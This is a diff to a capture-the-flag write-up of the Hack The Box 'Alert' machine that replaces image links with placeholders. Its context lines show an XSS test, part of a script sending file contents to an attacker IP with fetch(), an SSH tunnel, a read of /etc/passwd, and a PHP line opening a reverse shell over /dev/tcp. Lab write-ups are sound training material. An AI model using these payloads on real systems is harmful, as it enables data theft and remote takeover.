@@ -1,4 +1,4 @@
-![image](https://github.com/user-attachments/assets/030ff9e0-bef1-4519-ac5c-1b697f91c49f)![image](https://github.com/user-attachments/assets/4a261af5-e03e-4ac9-a1b7-a716623f9918)# Alert
+[screenshot][screenshot]# Alert
 OS: Linux\
 Difficulty: Easy
 
@@ -35,7 +35,7 @@ Service detection performed. Please report any incorrect results at https://nmap
 Nmap done: 1 IP address (1 host up) scanned in 12.23 seconds
 ```
 Fantastic, we have a web page up:\
-![image](https://github.com/user-attachments/assets/a8e12dcb-df03-4178-98c6-3726b54e16cd)\
+[screenshot]\
 It appears to be some kind of markdown viewer site where we can upload files.
 
 Inside the *About Us* section:\
@@ -123,7 +123,7 @@ Let us see what this one looks like when we attempt a normal upload:
 # Test Markdown
 Hello, World!
 ```
-![image](https://github.com/user-attachments/assets/f9a1dcfe-ec51-4e10-b7b1-5fd34c06df84)\
+[screenshot]\
 Now to test with Burp:
 ```HTTP
 POST /visualizer.php HTTP/1.1
@@ -206,7 +206,7 @@ What resulted was the lack of security headers, meaning we can do some *cross-si
 ```HTML
 <script>alert('XSS')</script>
 ```
-![image](https://github.com/user-attachments/assets/6550ec60-d83e-4dfa-8da5-2da78b1d8631)
+[screenshot]
 > It worked!
 >> Time to try more.
 
@@ -444,7 +444,7 @@ fetch("http://10.10.14.28:1337/?file_content=" + encodeURIComponent(data));
 </script>
 ```
 Upload, then share link, and finally paste link in Contact Us page!\
-![image](https://github.com/user-attachments/assets/74d2cd05-7d03-4bbd-974b-76acdc83841e)
+[screenshot]
 
 
 ### Post-Exploit
@@ -523,8 +523,8 @@ ssh -L 1337:127.0.0.1:8080 albert@alert.htb
 albert@alert:~$ ls /var/www
 alert.htb  html  statistics.alert.htb
 ```
-![image](https://github.com/user-attachments/assets/afa2393d-186f-4c90-a8f6-190d712617de)\
-![image](https://github.com/user-attachments/assets/ae567df5-14da-41df-a28b-80585c677085)
+[screenshot]\
+[screenshot]
 
 ```Bash
 albert@alert:~$ cat /etc/passwd
@@ -598,7 +598,7 @@ define('PATH', '/opt/website-monitor');
 exec("/bin/bash -c 'bash -i >/dev/tcp/10.10.14.28/1339 0>&1'");
 ?>
 ```
-![image](https://github.com/user-attachments/assets/864cddd8-23f1-466d-95bc-a616a90d337b)
+[screenshot]
 
 ```bash
 [us-vip-2][10.10.14.28][gntsqid@htb-tnbwsejwe9][~]
